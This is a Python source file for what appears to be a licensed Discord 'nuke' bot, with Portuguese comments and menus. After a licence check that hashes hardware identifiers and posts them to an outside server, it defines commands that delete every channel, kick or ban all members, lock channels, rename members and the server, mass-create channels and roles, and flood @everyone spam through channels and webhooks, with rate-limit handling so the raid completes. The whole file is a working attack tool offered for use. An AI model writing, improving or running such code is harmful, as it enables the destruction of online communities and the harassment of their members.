import discord
from discord.ext import commands
import asyncio
import os
import sys
import time
import logging
import hashlib
import platform
import uuid
import requests
import json
import subprocess

# DESABILITA LOGS
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.http').setLevel(logging.CRITICAL)
import warnings
warnings.filterwarnings("ignore")

TOKEN_FILE = "token.txt"

# ============================================
# SISTEMA DE LICENÇA
# ============================================

class LicenseSystem:
    def __init__(self):
        self.api_url = "http://morangodoamor.xo.je/api.php"
        self.license_file = "license.dat"
        self.hwid = self.get_hwid()
        
    def get_hwid(self):
        info = []
        info.append(platform.processor())
        info.append(platform.node())
        info.append(platform.machine())
        info.append(platform.system())
        info.append(platform.version())
        
        try:
            mac = uuid.getnode()
            info.append(str(mac))
        except:
            pass
        
        if platform.system() == "Windows":
            try:
                result = subprocess.check_output("wmic diskdrive get serialnumber", shell=True).decode()
                serial = result.split('\n')[1].strip()
                if serial:
                    info.append(serial)
            except:
                pass
        
        try:
            if platform.system() == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                     r"Software\Microsoft\Cryptography")
                machine_guid = winreg.QueryValueEx(key, "MachineGuid")[0]
                info.append(machine_guid)
        except:
            pass
        
        combined = "".join(info)
        return hashlib.sha256(combined.encode()).hexdigest()
    
    def check_license(self):
        if os.path.exists(self.license_file):
            try:
                with open(self.license_file, 'r') as f:
                    data = json.load(f)
                if data.get('hwid') == self.hwid:
                    return True
            except:
                pass
        return self.activate_menu()
    
    def activate_menu(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print("""
  ▄████  ██░ ██  ▒█████   █    ██  ██▓       
 ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒ ██  ▓██▒▓██▒       
▒██░▄▄▄░▒██▀▀██░▒██░  ██▒▓██  ▒██░▒██░       
░▓█  ██▓░▓█ ░██ ▒██   ██░▓▓█  ░██░▒██░       
░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒▒█████▓ ░██████▒   
 ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░   
  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░ ▒  ░   
░ ░   ░  ░  ░░ ░░ ░ ░ ▒   ░░░ ░ ░   ░ ░      
      ░  ░  ░  ░    ░ ░     ░         ░  ░   
                                             
""")
        
        print("\n" + "="*50)
        print("    ATIVAÇÃO DE LICENÇA")
        print("="*50)
        print(f"\n🔑 HWID: {self.hwid[:20]}...")
        print("\n[1] Ativar licença")
        print("[2] Sair")
        
        opcao = input("\n> ")
        
        if opcao == "1":
            print("\n📝 Digite sua chave:")
            key = input("> ").strip()
            
            print("\n⏳ Validando...")
            
            try:
                response = requests.post(
                    self.api_url,
                    params={"action": "validate"},
                    data={
                        "key": key,
                        "hwid": self.hwid
                    },
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    timeout=30
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('valid'):
                        license_data = {
                            "key": key,
                            "hwid": self.hwid,
                            "expires": data.get('expires'),
                            "activated_at": time.time()
                        }
                        with open(self.license_file, 'w') as f:
                            json.dump(license_data, f)
                        
                        print("\n✅ LICENÇA ATIVADA COM SUCESSO!")
                        time.sleep(2)
                        return True
                    else:
                        print(f"\n❌ {data.get('error', 'Licença inválida')}")
                else:
                    print(f"\n❌ Erro {response.status_code}")
                    
            except requests.exceptions.Timeout:
                print("\n❌ Tempo esgotado! Verifique sua internet.")
            except requests.exceptions.ConnectionError:
                print("\n❌ Erro de conexão! Verifique sua internet.")
            except Exception as e:
                print(f"\n❌ Erro: {str(e)}")
            
            input("\nPressione ENTER para tentar novamente...")
            return self.activate_menu()
        
        return False

# VERIFICA LICENÇA
license = LicenseSystem()
if not license.check_license():
    print("\n❌ Licença inválida!")
    input("Pressione ENTER para sair...")
    sys.exit()

# ============================================
# SEU CÓDIGO ORIGINAL
# ============================================

class SpamRed:
    GRADIENTS = [
        '\033[38;5;196m', '\033[38;5;160m', '\033[38;5;124m',
        '\033[38;5;88m', '\033[38;5;52m', '\033[38;5;88m',
        '\033[38;5;124m', '\033[38;5;160m', '\033[38;5;196m'
    ]
    
    @staticmethod
    def gradient(text):
        result = ""
        for i, char in enumerate(text):
            color_idx = i % len(SpamRed.GRADIENTS)
            result += SpamRed.GRADIENTS[color_idx] + char
        return result + '\033[0m'
    
    @staticmethod
    def red(text):
        return '\033[38;5;196m' + text + '\033[0m'

ASCII_ART = """
  ▄████  ██░ ██  ▒█████   █    ██  ██▓       
 ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒ ██  ▓██▒▓██▒       
▒██░▄▄▄░▒██▀▀██░▒██░  ██▒▓██  ▒██░▒██░       
░▓█  ██▓░▓█ ░██ ▒██   ██░▓▓█  ░██░▒██░       
░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒▒█████▓ ░██████▒   
 ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░   
  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░ ▒  ░   
░ ░   ░  ░  ░░ ░░ ░ ░ ▒   ░░░ ░ ░   ░ ░      
      ░  ░  ░  ░    ░ ░     ░         ░  ░   
                                             
"""

class RateLimitHandler:
    def __init__(self):
        self.retry_after = 0
    
    async def execute(self, coro):
        try:
            if self.retry_after > time.time():
                await asyncio.sleep(self.retry_after - time.time())
            return await coro
        except discord.errors.HTTPException as e:
            if e.status == 429:
                self.retry_after = time.time() + e.retry_after
                await asyncio.sleep(e.retry_after)
                return await self.execute(coro)
            return None
        except:
            return None

rate_handler = RateLimitHandler()
bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

def token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f:
            return f.read().strip()
    t = input("Token: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(t)
    return t

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(SpamRed.gradient(ASCII_ART))
    print(SpamRed.red(""))
    print(SpamRed.red(f"    ONLINE: {bot.user}"))
    print(SpamRed.red(f"    SERVIDORES: {len(bot.guilds)}"))
    print(SpamRed.red(f"    COMANDOS: {len(bot.commands)}"))
    print(SpamRed.red(""))
    print(SpamRed.red("    COMANDOS DISPONIVEIS"))
    print(SpamRed.red(""))
    print(SpamRed.red("    .nuke      - Destroi tudo e cria 50 canais"))
    print(SpamRed.red("    .clear     - Deleta todos canais"))
    print(SpamRed.red("    .kickall   - Expulsa todos membros"))
    print(SpamRed.red("    .banall    - Bane todos membros"))
    print(SpamRed.red("    .lockall   - Trava todos canais"))
    print(SpamRed.red("    .rn        - Renomeia todos membros"))
    print(SpamRed.red("    .rnsv      - Renomeia o servidor"))
    print(SpamRed.red("    .spam      - Spam no canal atual"))
    print(SpamRed.red("    .flood     - Flood em 50 canais"))
    print(SpamRed.red("    .cargos    - Cria 100 cargos"))
    print(SpamRed.red("    .canais    - Cria 50 canais"))
    print(SpamRed.red("    .webhook   - Cria webhooks e spama"))
    print(SpamRed.red("    .stop      - Desliga o bot"))
    print(SpamRed.red(""))
    print(SpamRed.red("    AGUARDANDO COMANDOS..."))
    print(SpamRed.red(""))
    
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="m!help"))

@bot.command()
async def nuke(ctx, *, msg="NUKED BY TURCOS"):
    print(SpamRed.red(f"[+] NUKE | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    tarefas = []
    for ch in ctx.guild.channels:
        tarefas.append(rate_handler.execute(ch.delete()))
    await asyncio.gather(*tarefas, return_exceptions=True)
    
    tarefas_canais = []
    for i in range(50):
        tarefas_canais.append(rate_handler.execute(ctx.guild.create_text_channel(f"FURADORES {i}")))
    canais_criados = await asyncio.gather(*tarefas_canais, return_exceptions=True)
    
    for i in range(0, len(canais_criados), 10):
        lote = canais_criados[i:i+10]
        tarefas_flood = []
        for canal in lote:
            if isinstance(canal, discord.TextChannel):
                for _ in range(20):
                    tarefas_flood.append(rate_handler.execute(canal.send(f"@everyone {msg}")))
        await asyncio.gather(*tarefas_flood, return_exceptions=True)
    
    print(SpamRed.red(f"[+] NUKE FINALIZADO"))

@bot.command()
async def clear(ctx):
    print(SpamRed.red(f"[+] CLEAR | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    tarefas = []
    for ch in ctx.guild.channels:
        tarefas.append(rate_handler.execute(ch.delete()))
    await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def kickall(ctx):
    print(SpamRed.red(f"[+] KICKALL | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    membros = [m for m in ctx.guild.members if m != ctx.author and m != bot.user]
    for i in range(0, len(membros), 20):
        lote = membros[i:i+20]
        tarefas = []
        for m in lote:
            tarefas.append(rate_handler.execute(m.kick()))
        await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def banall(ctx):
    print(SpamRed.red(f"[+] BANALL | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    membros = [m for m in ctx.guild.members if m != ctx.author and m != bot.user]
    for i in range(0, len(membros), 20):
        lote = membros[i:i+20]
        tarefas = []
        for m in lote:
            tarefas.append(rate_handler.execute(m.ban()))
        await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def lockall(ctx):
    print(SpamRed.red(f"[+] LOCKALL | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    tarefas = []
    for ch in ctx.guild.channels:
        tarefas.append(rate_handler.execute(ch.set_permissions(ctx.guild.default_role, send_messages=False)))
    await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def rn(ctx, *, nome="teste"):
    print(SpamRed.red(f"[+] RN | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    tarefas = []
    for m in ctx.guild.members:
        if m != bot.user:
            tarefas.append(rate_handler.execute(m.edit(nick=nome)))
    await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def rnsv(ctx, *, nome="teste"):
    print(SpamRed.red(f"[+] RNSV | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    await rate_handler.execute(ctx.guild.edit(name=nome))

@bot.command()
async def spam(ctx, n: int = 200, *, msg="teste"):
    print(SpamRed.red(f"[+] SPAM | {n}x"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    n = min(n, 1000)
    for i in range(0, n, 50):
        lote = min(50, n - i)
        tarefas = []
        for _ in range(lote):
            tarefas.append(rate_handler.execute(ctx.send(msg)))
        await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def flood(ctx, *, msg="teste"):
    print(SpamRed.red(f"[+] FLOOD | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    canais = ctx.guild.text_channels[:50]
    for i in range(0, len(canais), 10):
        lote = canais[i:i+10]
        tarefas = []
        for ch in lote:
            for _ in range(10):
                tarefas.append(rate_handler.execute(ch.send(f"@everyone {msg}")))
        await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def cargos(ctx):
    print(SpamRed.red(f"[+] CARGOS | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    for i in range(0, 100, 20):
        tarefas = []
        for j in range(i, min(i+20, 100)):
            tarefas.append(rate_handler.execute(ctx.guild.create_role(name=f"teste-{j}")))
        await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def canais(ctx):
    print(SpamRed.red(f"[+] CANAIS | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    tarefas = []
    for i in range(50):
        tarefas.append(rate_handler.execute(ctx.guild.create_text_channel(f"teste-{i}")))
    canais_criados = await asyncio.gather(*tarefas, return_exceptions=True)
    
    for i in range(0, len(canais_criados), 10):
        lote = canais_criados[i:i+10]
        tarefas_flood = []
        for ch in lote:
            if isinstance(ch, discord.TextChannel):
                tarefas_flood.append(rate_handler.execute(ch.send("@everyone teste")))
        await asyncio.gather(*tarefas_flood, return_exceptions=True)

@bot.command()
async def webhook(ctx):
    print(SpamRed.red(f"[+] WEBHOOK | {ctx.guild.name}"))
    try:
        await ctx.message.delete()
    except:
        pass
    
    tarefas_webhook = []
    for ch in ctx.guild.text_channels[:30]:
        tarefas_webhook.append(rate_handler.execute(ch.create_webhook(name="teste")))
    
    webhooks = await asyncio.gather(*tarefas_webhook, return_exceptions=True)
    
    for i in range(0, len(webhooks), 5):
        lote = webhooks[i:i+5]
        tarefas = []
        for w in lote:
            if isinstance(w, discord.Webhook):
                for _ in range(5):
                    tarefas.append(rate_handler.execute(w.send("@everyone teste")))
                tarefas.append(rate_handler.execute(w.delete()))
        await asyncio.gather(*tarefas, return_exceptions=True)

@bot.command()
async def stop(ctx):
    print(SpamRed.red(f"[+] BOT DESLIGADO"))
    try:
        await ctx.message.delete()
    except:
        pass
    await bot.close()

bot.run(token())